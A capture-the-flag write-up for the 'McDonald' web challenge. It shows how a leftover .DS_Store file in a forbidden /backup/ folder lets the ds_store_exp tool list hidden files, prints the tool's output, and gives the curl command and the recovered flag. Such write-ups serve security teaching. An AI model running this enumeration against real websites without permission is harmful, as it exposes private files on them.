# Challenge McDonald

44 Points

## Challenge

Our web admin name's "Mc Donald" and he likes apples and always forgets to throw away his apple cores..

http://35.207.91.38

## Solution

The webpage under the given URL shows just the same hint as the challenge. After a bit of nmap and html/javascript analysis nothing special was found. So we try some common URLs for hidden files. And we where lucky and found the folder "/backup/", but the response was a 403 FORBIDDEN. The hint talks about the admin and how he forgets his "apple cores" -> maybe this is a reference to the company apple? YES!

There is a "leftover" file from an apple file system, that can be downloaded: http://35.207.91.38/backup/.DS_Store

This file contains some file system informations of an apple file system. With this file it's possible to do a directory listening. There is an open source tool that can be used to get the needed information:

https://github.com/lijiejie/ds_store_exp.git

With this tool a simple command show some hidden files:
```
python ds_store_exp.py http://35.207.91.38/backup/.DS_Store
```

Output:
```
root@blackbox:# python ds_store_exp.py http://35.207.91.38/backup/.DS_Store
[+] http://35.207.91.38/backup/.DS_Store
[+] http://35.207.91.38/backup/c/.DS_Store
[+] http://35.207.91.38/backup/b/.DS_Store
[Folder Found] http://35.207.91.38/backup/c
[Folder Found] http://35.207.91.38/backup/b
[Folder Found] http://35.207.91.38/backup/a
[+] http://35.207.91.38/backup/c/c/.DS_Store
[+] http://35.207.91.38/backup/b/a/.DS_Store
[Folder Found] http://35.207.91.38/backup/c/c
[+] http://35.207.91.38/backup/c/b/.DS_Store
[+] http://35.207.91.38/backup/b/b/.DS_Store
[Folder Found] http://35.207.91.38/backup/b/a
[Folder Found] http://35.207.91.38/backup/c/b
[+] http://35.207.91.38/backup/b/noflag.txt
[Folder Found] http://35.207.91.38/backup/b/c
[Folder Found] http://35.207.91.38/backup/b/b
[Folder Found] http://35.207.91.38/backup/c/c/a
[+] http://35.207.91.38/backup/b/a/c/.DS_Store
[Folder Found] http://35.207.91.38/backup/c/c/b
[+] http://35.207.91.38/backup/b/a/b/.DS_Store
[Folder Found] http://35.207.91.38/backup/c/c/c
[Folder Found] http://35.207.91.38/backup/b/a/a
[+] http://35.207.91.38/backup/b/a/noflag.txt
[Folder Found] http://35.207.91.38/backup/b/a/c
[Folder Found] http://35.207.91.38/backup/c/a
[Folder Found] http://35.207.91.38/backup/b/a/b
[+] http://35.207.91.38/backup/b/a/c/flag.txt
[+] http://35.207.91.38/backup/b/a/c/noflag.txt

```

Now download the found flag.txt and look at the flag:

```
root@blackbox:# curl http://35.207.91.38/backup/b/a/c/flag.txt
35c3_Appl3s_H1dden_F1l3s
```
